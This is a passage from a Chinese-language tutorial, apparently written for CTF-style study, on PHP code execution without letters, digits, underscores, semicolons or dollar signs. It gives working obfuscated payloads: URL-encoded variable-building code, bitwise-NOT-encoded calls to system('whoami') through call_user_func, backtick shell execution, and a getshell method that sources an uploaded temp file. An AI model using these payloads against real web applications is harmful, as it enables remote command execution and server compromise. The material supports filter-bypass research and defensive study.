b%3b%24__%2b%2b%3b%24__%2b%2b%3b%0a%24____.%3d%24__%3b%0a%24__%3d%24_%3b%0a%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%0a%24____.%3d%24__%3b%0a%24__%3d%24_%3b%0a%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%0a%24____.%3d%24__%3b%0a%24__%3d%24_%3b%0a%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%0a%24____.%3d%24__%3b%0a%24_%3d%24%24____%3b%0a%24___(%24_%5b_%5d)%3b`

![wiPIW6.png](https://s1.ax1x.com/2020/09/03/wiPIW6.png)

#### 方法4：短标签

PHP中有两种短标签，<??>和<?=?>。其中，<??>相当于对<?php>的替换。而<?=?>则是相当于<? echo>。例如:

	<?= '111'?>

将会输出'111' 大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，<?=?>这种写法总是适用的，<??>这种写法则需要short_open_tag开启才行。


#### 方法5：反引号

PHP中，反引号可以起到命令执行的效果。

```
<?php
$_=`whoami`;
echo $_;
// <?= `whoami`?>
```

成功执行命令并输出。

## 进阶

#### 过滤了_

在我们上面的例子中，_的主要用途就是在构造变量。但其实最简便的方法里面，我们可以完全不用_，这里给出一个例子。

	?><?=`{${~"%a0%b8%ba%ab"}[%a0]}`?>

分析下这个Payload，?>闭合了eval自带的<?标签。接下来使用了短标签。{}包含的PHP代码可以被执行，~"%a0%b8%ba%ab"为"_GET"，通过反引号进行shell命令执行。最后我们只要GET传参%a0即可执行命令。

![wiEfGn.png](https://s1.ax1x.com/2020/09/03/wiEfGn.png)

#### 过滤了;

分号我们只是用在结束PHP语句上，我们只要把所有的PHP语句改成短标签形式，就可以不使用;了。

#### 过滤了$

过滤了$的影响是我们彻底不能构造变量了。

**php7:**

在PHP7中，我们可以使用($a)()这种方法来执行命令，比如`('phpinfo')()`。(不使用assert()是因为php7他已经不是一个函数了。)。使用文章之前的脚本抛出可以取反得到`phpinfo`的字符串。

得到：

	(~%8f%97%8f%96%91%99%90)();

![wiZC60.png](https://s1.ax1x.com/2020/09/03/wiZC60.png)

这里也可以使用回调函数。call_user_func

* call_user_func — 把第一个参数作为回调函数调用

`shell=(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,'');`
其中~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c是"call_user_func"，~%8c%86%8c%8b%9a%92是"system"，~%88%97%90%9e%92%96是"whoami"。
成功执行命令

![wiZJtH.png](https://s1.ax1x.com/2020/09/03/wiZJtH.png)


**php5:**

PHP5中不再支持($a)()这种方法来调用函数。因此利用方法较为复杂.

继续参考[p神博客](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html),

“反引号”就是PHP中最简单的执行shell的方法。

因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、$的系统命令来getshell？

两个有趣的Linux shell知识点：

* shell下可以利用 `.` 来执行任意脚本
* Linux文件名支持用 `glob` 通配符代替

`.` 或者叫 `period` ，它的作用和`source`一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则 `. file`的意思就是用bash执行file文件中的命令。

用 `. file`执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用.来执行它了.

这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是 `/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。

参考： https://blog.csdn.net/qq_43431158/article/details/108035878
https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html
https://xz.aliyun.com/t/ss107

https://xz.aliyun.com/t/8107#toc-9